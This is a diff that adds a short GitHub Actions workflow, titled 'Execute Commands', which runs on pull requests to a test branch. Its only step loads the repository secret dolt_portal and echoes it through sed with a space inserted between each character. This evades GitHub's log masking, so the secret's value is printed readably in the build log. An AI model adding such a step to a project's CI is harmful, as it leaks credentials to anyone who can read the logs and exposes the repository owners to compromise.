@@ -1,0 +1,16 @@
+name: Execute Commands
+on:
+  pull_request:
+    branches:
+      - test
+jobs:
+  execute-commands:
+    runs-on: ubuntu-latest
+    env:
+      DOLT_PORTAL: ${{ secrets.dolt_portal }}
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      - name: Access GitHub Secret
+        run: |
+          echo "GitHub Secret Value: $DOLT_PORTAL" | sed 's/./& /g'
